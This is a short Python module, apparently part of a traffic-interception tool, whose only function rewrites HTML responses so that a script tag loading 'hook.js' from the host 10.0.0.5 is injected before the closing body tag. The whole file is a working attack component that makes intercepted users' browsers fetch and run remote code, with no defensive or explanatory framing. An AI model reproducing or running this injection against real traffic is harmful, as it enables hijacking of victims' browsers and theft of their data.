'''
Handles the actual modification of data
Called by the interceptor.py right before the response is sent back to the user
'''
import re

def inject_payload(html_content):
    payload = '<script src="http://10.0.0.5/hook.js"></script>' 
    
    # Find </body> and replace it with our script tag + </body>
    modified_content = re.sub(r'</body>', f'{payload}</body>', html_content, flags=re.IGNORECASE)
    return modified_content
